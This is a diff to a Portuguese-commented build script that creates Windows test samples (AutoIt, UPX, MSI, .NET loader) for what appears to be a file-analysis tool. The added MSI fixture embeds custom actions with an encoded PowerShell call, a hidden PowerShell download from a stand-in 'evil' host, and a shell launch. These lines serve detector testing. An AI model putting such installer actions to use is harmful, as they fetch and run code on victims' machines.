@@ -8,8 +8,10 @@ apt-get update -qq
 apt-get install -y -qq --no-install-recommends gcc-mingw-w64-x86-64 gcc-mingw-w64-i686 \
   binutils-mingw-w64-x86-64 binutils-mingw-w64-i686 mingw-w64-x86-64-dev mingw-w64-i686-dev \
   osslsigncode upx-ucl mono-mcs python3-pefile python3-pip openssl nsis binutils curl libpython3.13 \
+  msitools gcab \
   ca-certificates >/dev/null
-pip install --quiet --break-system-packages dnfile==0.15.1 pyinstaller==6.22.3 >/dev/null
+pip install --quiet --break-system-packages dnfile==0.15.1 pyinstaller==6.22.3 \
+  autoit-ripper==1.2.0 >/dev/null
 W=/work
 rm -rf "$W" && mkdir -p "$W" && cp /f/pe/* "$W" && cd "$W"
 
@@ -53,7 +55,38 @@ for v in 6.2.2:8117d10d00a2ad33a1390978ea3872861c330e087914410a6377b22c4c5b8563 
     "https://github.com/jrsoftware/issrc/releases/download/is-$(echo "$ver" | tr . _)/innosetup-$ver.exe"
   echo "$sum  inno-$ver.exe" | sha256sum -c --quiet
 done
+# AutoIt (plans/caca-e-formatos, item 5): o recurso SCRIPT de um executavel EA06, com o script
+# tokenizado e comprimido como o do Aut2Exe (autoit.py), e a mesma coisa dentro de UPX (duas geracoes).
+python3 autoit.py payload.bin autoit.bin
+printf 'SCRIPT RCDATA "autoit.bin"\n' > autoit.rc
+$X86-windres autoit.rc -O coff -o autoit.o
+$X86-gcc -O1 -s -o autoit.exe tiny.c autoit.o
+# Com o recurso cifrado, o executavel minimo nao comprime o bastante para o upx: o com UPX leva uma
+# tabela de 64 KB que comprime (como o interpretador AutoIt de verdade, que tem ~1 MB de codigo).
+printf 'const char tabela[65536] = "DeepLook";\nint main(void){return tabela[1];}\n' > autoit-big.c
+$X86-gcc -O1 -s -o autoit-big.exe autoit-big.c autoit.o
+upx -q --best -o autoit-upx.exe autoit-big.exe >/dev/null
+# MSI (plans/caca-e-formatos, item 4): pelo msibuild (msitools), com as tabelas em IDT: uma DLL e
+# um JScript na tabela Binary, um VBScript embutido na acao, um EXE com linha de comando como SYSTEM
+# e um CAB como midia.
+mkdir -p msi/Binary && cp teste.dll msi/Binary/acao.dll
+printf 'var s = new ActiveXObject("WScript.Shell");\ns.Run("powershell -enc SQBFAFgA");\n' > msi/Binary/script.js
+printf 'Property\tValue\ns72\tl0\nProperty\tProperty\nProductName\tAtualizador Teste\nManufacturer\tFornecedor Teste\nProductVersion\t1.2.3\nProductCode\t{11111111-2222-3333-4444-555555555555}\n' > msi/Property.idt
+printf 'Name\tData\ns72\tv0\nBinary\tName\nAcaoDll\tacao.dll\nScriptJs\tscript.js\n' > msi/Binary.idt
+printf 'Action\tType\tSource\tTarget\ns72\ti2\tS72\tS255\nCustomAction\tAction\nRodaDll\t1\tAcaoDll\tDllMain\nRodaJs\t5\tScriptJs\t\nInline\t38\t\tCreateObject("WScript.Shell").Run "cmd /c calc"\nBaixa\t3106\tTARGETDIR\tpowershell -w hidden -c iwr http://msi.evil.test/p.exe -o p.exe\nSetProp\t51\tFOO\tbar\n' > msi/CustomAction.idt
+(
+  cd msi
+  msibuild teste.msi -s 'Teste' 'DeepLook' ';1033' '{AAAAAAAA-BBBB-CCCC-DDDD-EEEEEEEEEEEE}'
+  msibuild teste.msi -i Property.idt
+  msibuild teste.msi -i Binary.idt
+  msibuild teste.msi -i CustomAction.idt
+  printf 'arquivo dentro do cab\n' > leia.txt
+  gcab -c -z midia.cab leia.txt
+  msibuild teste.msi -a midia.cab midia.cab
+)
+cp msi/teste.msi teste.msi
 mcs -nologo -out:dotnet.exe hello.cs
+mcs -nologo -out:dotnet-loader.exe -resource:prog32.exe,carga.bin carregador.cs
 upx -q --best -o upx64.exe prog64.exe >/dev/null
 upx -q --best -o upx32.exe prog32.exe >/dev/null
 upx -q --best -o upx-dll.dll teste.dll >/dev/null
@@ -89,7 +122,7 @@ mkdir -p /out
 cp prog64.exe prog32.exe teste.dll dotnet.exe upx64.exe upx32.exe upx-disfarcado.exe rich.exe \
   rich-forjado.exe checksum-ok.exe checksum-errado.exe overlay.exe assinado.exe adulterado.exe \
   autoassinado.exe upx-dll.dll ofuscado64.exe ofuscado32.exe emulado32.exe linux.elf nsis.exe \
-  pyinst.bin \
+  pyinst.bin autoit.exe autoit-upx.exe payload.bin teste.msi dotnet-loader.exe \
   inno-6.2.2.exe inno-6.4.3.exe reference.json /out/
 # Arquivos com o dono de quem roda os testes (senao o proximo rm do runner falha).
 if [ -n "$OWNER" ]; then chown -R "$OWNER" /out; fi
